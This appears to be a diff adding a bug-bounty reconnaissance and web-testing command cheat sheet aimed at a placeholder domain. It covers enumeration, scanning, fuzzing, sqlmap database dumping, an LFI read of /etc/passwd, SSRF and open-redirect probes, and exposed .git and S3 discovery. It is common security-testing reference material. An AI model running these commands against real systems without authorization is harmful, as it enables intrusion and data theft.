@@ -1,0 +1,87 @@
+# === Asset Discovery ===
+amass enum -passive -d target.com
+subfinder -d target.com -silent
+assetfinder --subs-only target.com
+curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq .
+findomain -t target.com -u findomain.txt
+anubis -d target.com
+# === Active Recon / Probing ===
+httpx -l domains.txt -status-code -title -tech-detect -web-server -follow-redirects -no-color -o probed.txt
+nmap -sC -sV -T4 -Pn target.com
+whatweb target.com
+wafw00f https://target.com
+# === Endpoint Discovery ===
+gau target.com | tee gau.txt
+waybackurls target.com | tee wayback.txt
+hakrawler -url https://target.com -depth 2 -plain
+katana -u https://target.com -d 2 -jc -jsl -silent
+# === Directory Bruteforcing / Path Discovery ===
+ffuf -u https://target.com/FUZZ -w wordlist.txt -e .php,.html,.bak,.txt -mc all
+dirsearch -u https://target.com -e php,html,js,txt -x 403,404 -t 50
+gobuster dir -u https://target.com -w common.txt -x php,html,txt
+feroxbuster -u https://target.com -w /path/to/wordlist -x php,html -t 30
+# === JS File Analysis ===
+gau target.com | grep '\.js' | httpx -mc 200 -silent | xargs -n1 -I{} curl -s {} >> jsfiles.txt
+linkfinder -i jsfiles.txt -o cli
+secretfinder -i jsfiles.txt -o cli
+# === Parameter & Payload Discovery ===
+arjun -u https://target.com/page.php -t 50
+paramspider -d target.com
+gf xss urls.txt
+gf lfi urls.txt
+gf sqli urls.txt
+# === Fuzzing & Testing ===
+ffuf -u https://target.com/page.php?FUZZ=test -w payloads/xss.txt
+wfuzz -c -w payloads/lfi.txt -u https://target.com/index.php?file=FUZZ --hc 404
+# === XSS Testing ===
+dalfox file urls.txt
+xsstrike -u "https://target.com/page?query=test"
+kxss < urls.txt
+# === SQL Injection ===
+sqlmap -u "https://target.com/index.php?id=1" --batch --risk=3 --level=5 --dbs
+sqlmap -r request.txt --batch --dump
+# === SSRF Detection ===
+ffuf -u https://target.com/page=FUZZ -w ssrf.txt
+curl "https://target.com/image?url=http://127.0.0.1"
+# === Open Redirects ===
+ffuf -u https://target.com/redirect=FUZZ -w redirects.txt
+curl -i "https://target.com/redirect?url=https://evil.com"
+# === LFI / RFI Testing ===
+ffuf -u https://target.com/page=FUZZ -w lfi.txt
+curl "https://target.com/?page=../../../../etc/passwd"
+# === CORS Misconfiguration ===
+corsy -u https://target.com -t 30
+python3 corsy.py -u https://target.com
+# === Subdomain Takeover Detection ===
+subjack -w subdomains.txt -t 100 -timeout 30 -ssl -c fingerprints.json -v
+tko-subs -domains=domains.txt -data=providers-data.csv -out=results.txt
+nuclei -l domains.txt -t takeovers/
+# === Cloud Asset Discovery ===
+s3scanner scan --bucket targetbucket
+aws s3 ls s3://bucket-name --no-sign-request
+slurp -t target.com
+# === Git Exposed File Discovery ===
+gitdumper.sh https://target.com/.git/ git-dump/
+gitleaks detect -s .
+# === WordPress Scanning ===
+wpscan --url https://target.com --enumerate u,vp,vt,cb,dbe --api-token YOUR_API_TOKEN
+# === Vulnerability Templates ===
+nuclei -l urls.txt -t cves/
+nuclei -l urls.txt -t vulnerabilities/
+nuclei -l urls.txt -t misconfiguration/
+nuclei -l urls.txt -t exposures/
+# === DNS Attacks / Zone Transfer ===
+dig axfr @ns1.target.com target.com
+dnsrecon -d target.com -a
+dnsenum target.com
+# === Port Scanning (Advanced) ===
+nmap -p- -sC -sV -Pn --min-rate=1000 target.com
+rustscan -a target.com --ulimit 5000 | nmap -sC -sV -p-
+# === Misc Utilities ===
+shodan search apache
+amass track -d target.com -config config.ini
+httpmirror -u "http://target.com"
+interlace -tL targets.txt -c "nuclei -u _target_ -t cves/"
+# === GitHub Dorking ===
+github-dork target.com
+git-hound search target.com
